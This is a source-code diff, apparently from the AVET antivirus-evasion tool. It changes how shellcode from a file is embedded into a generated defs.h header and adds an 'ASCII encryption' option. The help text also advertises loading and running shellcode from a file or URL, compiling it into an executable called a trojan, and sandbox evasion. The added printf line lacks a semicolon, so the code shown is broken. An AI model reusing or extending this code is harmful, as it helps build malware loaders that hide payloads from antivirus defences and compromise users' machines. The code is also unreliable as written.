@@ -126,20 +126,24 @@ int main (int argc, char **argv)
 		}
 
 		fseek (file_def, 0, SEEK_END);
-		//fprintf (file_def, "#define FVALUE\n");
 
 		// read the shellcode file, write to defs.h
 		FILE *file_sh = fopen ( fvalue, "r" );
 
 		if ( file_sh != NULL )
 		{
-			fprintf (file_def, "#define FVALUE \"");
+			if(Eflag)
+				fprintf (file_def, "#define FVALUE \"");
+			else
+				fprintf (file_def, "#define FVALUE \"\"\n");
+
 			char line [ 5000 ];
 
 			while ( fgets ( line, sizeof line, file_sh ) != NULL )
 				fprintf (file_def, "%s", line);           
 
-			fprintf (file_def, "\"\n");
+			if(Eflag)
+				fprintf (file_def, "\"\n");
 			//fprintf (file_def, "\\n");
 			fclose ( file_sh );
 		}
@@ -203,6 +207,7 @@ void print_help()
 	printf("-l load and exec shellcode from given file, call is with mytrojan.exe myshellcode.txt");
 	printf("-f compile shellcode into avet.exe, needs filename\n");
 	printf("-u load and exec shellcode from url using internet explorer (url is compiled into executable)\n");
+	printf("-E use avets ASCII encryption, often do not has to be used\n")
 	printf("-F use fopen sandbox evasion\n");
 	printf("-X compile for 64 bit\n");
 	printf("-p print debug information\n");
